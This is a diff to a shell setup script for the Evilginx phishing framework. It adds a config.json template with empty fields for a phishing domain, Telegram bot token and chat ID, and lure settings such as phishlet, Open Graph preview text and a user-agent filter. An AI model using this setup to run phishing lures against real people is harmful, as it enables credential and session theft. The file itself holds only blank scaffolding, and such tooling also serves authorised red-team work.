@@ -101,7 +101,38 @@ ensure_evilginx_exists() {
     if [[ ! -f "$evilginx_file" ]]; then
       log "Creating empty $file in .evilginx directory..."
       if [[ "$file" == "config.json" ]]; then
-        echo "{}" > "$evilginx_file"
+        # Create config.json with minimum required structure
+        cat > "$evilginx_file" << EOF
+{
+  "general": {
+    "domain": "",
+    "redirect_url": "",
+    "telegram_bot_token": "",
+    "telegram_chat_id": "",
+    "unauth_url": ""
+  },
+  "blacklist": {
+    "mode": "off"
+  },
+  "lures": [
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/",
+      "paused": 0,
+      "phishlet": "001",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    }
+  ]
+}
+EOF
       else
         touch "$evilginx_file"
       fi
